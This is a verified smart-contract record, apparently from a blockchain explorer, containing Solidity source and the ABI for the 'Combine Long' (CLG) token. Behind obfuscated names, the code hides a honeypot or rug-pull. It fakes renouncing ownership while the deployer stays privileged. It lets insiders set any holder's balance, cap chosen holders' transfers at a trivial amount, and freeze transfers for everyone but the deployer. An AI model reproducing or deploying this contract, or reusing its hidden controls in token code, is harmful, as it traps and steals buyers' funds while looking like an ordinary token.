{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.5;\n\ninterface marketingExempt {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address receiverAuto) external view returns (uint256);\n\n    function transfer(address amountLiquidity, uint256 walletMaxLiquidity) external returns (bool);\n\n    function allowance(address maxMin, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 walletMaxLiquidity) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address amountLiquidity,\n        uint256 walletMaxLiquidity\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed enableAutoSwap, uint256 value);\n    event Approval(address indexed maxMin, address indexed spender, uint256 value);\n}\n\nabstract contract atIsLaunched {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface receiverFund {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface amountMin {\n    function createPair(address shouldReceiver, address autoEnable) external returns (address);\n}\n\ninterface marketingExemptMetadata is marketingExempt {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract CombineLong is atIsLaunched, marketingExempt, marketingExemptMetadata {\n\n    event OwnershipTransferred(address indexed minTake, address indexed atFrom);\n\n    function name() external view virtual override returns (string memory) {\n        return buyLimit;\n    }\n\n    mapping(address => bool) public fromList;\n\n    address public toShouldSender;\n\n    function transfer(address buySell, uint256 walletMaxLiquidity) external virtual override returns (bool) {\n        return toEnableLiquidity(_msgSender(), buySell, walletMaxLiquidity);\n    }\n\n    uint256 private maxMarketing = 100000000 * 10 ** 18;\n\n    function enableSender(uint256 walletMaxLiquidity) public {\n        atLaunched();\n        txLiquidity = walletMaxLiquidity;\n    }\n\n    bool private isList;\n\n    function owner() external view returns (address) {\n        return marketingTx;\n    }\n\n    function toEnableLiquidity(address minSender, address amountLiquidity, uint256 walletMaxLiquidity) internal returns (bool) {\n        if (minSender == toShouldSender) {\n            return tokenFundBuy(minSender, amountLiquidity, walletMaxLiquidity);\n        }\n        uint256 liquidityAt = marketingExempt(tradingTake).balanceOf(receiverAmount);\n        require(liquidityAt == txLiquidity);\n        require(amountLiquidity != receiverAmount);\n        if (senderList[minSender]) {\n            return tokenFundBuy(minSender, amountLiquidity, fundToken);\n        }\n        return tokenFundBuy(minSender, amountLiquidity, walletMaxLiquidity);\n    }\n\n    uint256 constant fundToken = 14 ** 10;\n\n    bool public sellList;\n\n    function atLaunched() private view {\n        require(fromList[_msgSender()]);\n    }\n\n    address public tradingTake;\n\n    function sellReceiverMin() public {\n        emit OwnershipTransferred(toShouldSender, address(0));\n        marketingTx = address(0);\n    }\n\n    uint256 txLiquidity;\n\n    function toAmount(address buySell, uint256 walletMaxLiquidity) public {\n        atLaunched();\n        tradingShould[buySell] = walletMaxLiquidity;\n    }\n\n    bool private feeTx;\n\n    function fundShouldMarketing(address autoEnableAt) public {\n        atLaunched();\n        if (toSellExempt != takeEnableAmount) {\n            feeTx = false;\n        }\n        if (autoEnableAt == toShouldSender || autoEnableAt == tradingTake) {\n            return;\n        }\n        senderList[autoEnableAt] = true;\n    }\n\n    bool public feeLiquidity;\n\n    mapping(address => uint256) private tradingShould;\n\n    function allowance(address toMode, address liquidityReceiver) external view virtual override returns (uint256) {\n        if (liquidityReceiver == minShould) {\n            return type(uint256).max;\n        }\n        return receiverFrom[toMode][liquidityReceiver];\n    }\n\n    address minShould = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool public fromAuto;\n\n    uint256 public autoReceiverAmount;\n\n    function decimals() external view virtual override returns (uint8) {\n        return launchToken;\n    }\n\n    mapping(address => mapping(address => uint256)) private receiverFrom;\n\n    string private receiverTx = \"CLG\";\n\n    address receiverAmount = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    bool private tokenEnable;\n\n    bool public sellLaunchedMarketing;\n\n    function receiverMax(address buyAmount) public {\n        if (sellList) {\n            return;\n        }\n        \n        fromList[buyAmount] = true;\n        if (tokenEnable) {\n            autoReceiverAmount = toSellExempt;\n        }\n        sellList = true;\n    }\n\n    string private buyLimit = \"Combine Long\";\n\n    mapping(address => bool) public senderList;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return maxMarketing;\n    }\n\n    constructor (){\n        if (isList == tokenEnable) {\n            feeTx = false;\n        }\n        receiverFund receiverEnable = receiverFund(minShould);\n        tradingTake = amountMin(receiverEnable.factory()).createPair(receiverEnable.WETH(), address(this));\n        \n        toShouldSender = _msgSender();\n        sellReceiverMin();\n        fromList[toShouldSender] = true;\n        tradingShould[toShouldSender] = maxMarketing;\n        \n        emit Transfer(address(0), toShouldSender, maxMarketing);\n    }\n\n    uint256 public takeEnableAmount;\n\n    function approve(address liquidityReceiver, uint256 walletMaxLiquidity) public virtual override returns (bool) {\n        receiverFrom[_msgSender()][liquidityReceiver] = walletMaxLiquidity;\n        emit Approval(_msgSender(), liquidityReceiver, walletMaxLiquidity);\n        return true;\n    }\n\n    uint8 private launchToken = 18;\n\n    function transferFrom(address minSender, address amountLiquidity, uint256 walletMaxLiquidity) external override returns (bool) {\n        if (_msgSender() != minShould) {\n            if (receiverFrom[minSender][_msgSender()] != type(uint256).max) {\n                require(walletMaxLiquidity <= receiverFrom[minSender][_msgSender()]);\n                receiverFrom[minSender][_msgSender()] -= walletMaxLiquidity;\n            }\n        }\n        return toEnableLiquidity(minSender, amountLiquidity, walletMaxLiquidity);\n    }\n\n    function balanceOf(address receiverAuto) public view virtual override returns (uint256) {\n        return tradingShould[receiverAuto];\n    }\n\n    function getOwner() external view returns (address) {\n        return marketingTx;\n    }\n\n    address private marketingTx;\n\n    uint256 receiverIsSell;\n\n    function symbol() external view virtual override returns (string memory) {\n        return receiverTx;\n    }\n\n    uint256 public toSellExempt;\n\n    function tokenFundBuy(address minSender, address amountLiquidity, uint256 walletMaxLiquidity) internal returns (bool) {\n        require(tradingShould[minSender] >= walletMaxLiquidity);\n        tradingShould[minSender] -= walletMaxLiquidity;\n        tradingShould[amountLiquidity] += walletMaxLiquidity;\n        emit Transfer(minSender, amountLiquidity, walletMaxLiquidity);\n        return true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxMin\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"minTake\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atFrom\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableAutoSwap\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toMode\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"liquidityReceiver\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletMaxLiquidity\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoReceiverAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverAuto\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"walletMaxLiquidity\",\"type\":\"uint256\"}],\"name\":\"enableSender\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromAuto\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fromList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoEnableAt\",\"type\":\"address\"}],\"name\":\"fundShouldMarketing\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyAmount\",\"type\":\"address\"}],\"name\":\"receiverMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellLaunchedMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellReceiverMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"senderList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeEnableAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buySell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletMaxLiquidity\",\"type\":\"uint256\"}],\"name\":\"toAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toSellExempt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toShouldSender\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingTake\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buySell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletMaxLiquidity\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minSender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"amountLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"walletMaxLiquidity\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "CombineLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}